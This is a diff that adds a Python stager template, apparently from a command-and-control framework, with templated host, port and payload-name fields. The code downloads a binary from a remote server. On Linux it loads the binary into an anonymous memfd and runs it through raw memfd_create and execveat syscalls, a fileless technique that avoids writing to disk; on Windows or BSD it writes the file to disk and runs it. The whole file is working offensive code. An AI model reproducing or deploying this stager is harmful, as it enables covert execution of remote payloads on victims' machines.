@@ -1,0 +1,47 @@
+import ctypes
+import os
+import requests
+import time
+import subprocess
+
+bb = requests.get('{{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}').content
+
+# Linux syscalls for memfd
+#               amd64 arm  arm64  x86
+# memfd_create	319	  385  279	  356
+# execveat	    322	  387  281	  358
+# write	          1	    4	64	    4
+
+syscalls = {"amd64": (319, 322, 1),
+            "arm": (385, 387, 4),
+            "arm64": (279, 281, 64),
+            "386": (356, 358, 4),
+            }
+
+if "{{.OS}}" == "windows" or "bsd" in "{{.OS}}" or "{{.Arch}}" not in syscalls:
+    with open("{{.Name}}", 'w') as f:
+        f.write(bb)
+    subprocess.call(['{{.Name}}'])
+    exit(0)
+
+
+libc = ctypes.CDLL(None)
+syscall = libc.syscall
+
+
+memfdSyscall = syscalls["{{.Arch}}"][0]
+execveat = syscalls["{{.Arch}}"][1]
+writeSyscall = syscalls["{{.Arch}}"][2]
+
+# memfd_create
+fd = syscall(memfdSyscall, '', 1)
+
+# write(fd, buf, len)
+syscall(writeSyscall, fd, bb, len(bb))
+
+
+envp = (ctypes.c_char_p * 0)()
+envp[:] = []
+
+# execveat(fd, path, argv, envp, flags) -- 0x1000 is AT_EMPTY_PATH
+syscall(execveat, fd, '', envp, envp, 0x1000)
